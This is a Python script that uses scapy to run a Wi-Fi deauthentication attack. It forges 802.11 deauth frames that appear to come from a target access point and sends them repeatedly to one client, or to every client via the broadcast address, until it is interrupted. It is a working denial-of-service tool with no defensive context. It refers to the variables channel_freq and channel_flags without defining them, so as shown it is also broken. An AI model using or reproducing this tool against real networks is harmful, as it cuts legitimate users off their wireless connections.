import time
from threading import Thread, Lock, Event
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
seq_pkt1 = 0
stop_event = Event()

def set_seq():
    global seq_pkt1
    seq_pkt1 = 0

def produce_sc(frag: int, seq: int) -> int:
    return (seq << 4) + frag

def deauth_pkt(STA, AP, seq, channel_freq, channel_flags):
    radio_tap = RadioTap(
        present=0x00008004,
        Rate=1.0,
        TXFlags=0x0018,
    )

    dot11 = Dot11(
        type=0,
        subtype=12,
        addr1=STA,
        addr2=AP,
        addr3=AP,
        SC=produce_sc(frag=0, seq=seq)
    )
    deauth = Dot11Deauth(
        reason=7
    )

    return radio_tap / dot11 / deauth

def send_pkt1(STA, AP, interface):
    global seq_pkt1
    
    try:
        while not stop_event.is_set():
            pkt1 = deauth_pkt(STA, AP, seq_pkt1, channel_freq, channel_flags)
            sendp(pkt1, iface=interface, verbose=False, count=1)
            seq_pkt1 += 1
            time.sleep(0.1)

    except Exception as e:
        print(f"Pkt1 sending stopped: {e}")


def start_deauth(STA, AP, interface):
    try:
        if STA == AP:
            STA = "ff:ff:ff:ff:ff:ff"
        print(f"channel freq {channel_freq}, channel flags {channel_flags}")
        thread1 = Thread(target=send_pkt1, args=(STA, AP, interface))
        thread1.start()
        
        while True:
            try:
                time.sleep(1)
            except KeyboardInterrupt:
                print("Deauth attack stopped.")
                stop_event.set()
                thread1.join()
                break
        
    except Exception as e:
        stop_event.set()
        print(f"Deauth attack stopped: {e}")
